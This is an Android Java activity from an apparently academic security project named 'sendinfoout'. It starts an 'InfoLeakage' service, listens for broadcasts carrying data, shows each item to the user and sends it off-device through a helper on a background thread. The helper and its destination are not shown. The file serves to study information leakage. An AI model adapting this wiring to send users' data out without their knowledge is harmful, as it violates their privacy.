package edu.ntu.security.sendinfoout;

import java.io.IOException;
import java.util.List;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		/*if (savedInstanceState == null) {
			getSupportFragmentManager().beginTransaction()
					.add(R.id.container, new PlaceholderFragment()).commit();
		}*/
		
		//Start the service
		Intent intent = new Intent(this, InfoLeakage.class);
		startService(intent);
		
		IntentFilter filter = new IntentFilter("edu.ntu.security.INFO_BROADCAST");
		registerReceiver(mBroadcastReceiver, filter);
	}
	
	/**
	 * Check if the intent is available or not
	 * @param ctx
	 * @param intent
	 * @return
	 */
	public static boolean isIntentAvailable(Context ctx, Intent intent) {
		final PackageManager mgr = ctx.getPackageManager();
		List<ResolveInfo> list = mgr.queryIntentActivities(intent, 
		      PackageManager.MATCH_DEFAULT_ONLY);
		return list.size() > 0;
	} 


	public BroadcastReceiver mBroadcastReceiver = new BroadcastReceiver(){

		@Override
		public void onReceive(Context context, Intent intent) {			
			final String data = intent.getExtras().getString("data");
			Utils.notifyUser(MainActivity.this, data);
			Thread thr = new Thread(){
				@Override
				public void run(){
					try {
						Utils.sendInfoOut(data);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			};
			thr.start();
		}
		
	};

}
